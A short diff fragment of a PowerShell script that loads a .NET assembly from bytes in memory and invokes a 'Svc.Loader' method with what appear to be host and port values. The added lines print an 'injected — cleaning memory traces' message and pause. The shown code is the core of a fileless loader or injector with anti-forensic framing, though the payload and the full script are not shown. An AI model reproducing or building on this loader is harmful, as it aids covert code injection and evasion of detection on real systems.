@@ -26,6 +26,8 @@ $asm = [Reflection.Assembly]::Load($bytes)
 $result = $asm.GetType("Svc.Loader").GetMethod("Run").Invoke($null, @($H, $P))
 
 if ($result -eq 0) {
+    Write-Host "[+] injected — cleaning memory traces..."
+    Start-Sleep -Seconds 18
     Write-Host "[+] done"
 } else {
     Write-Host "[!] failed ($result)"
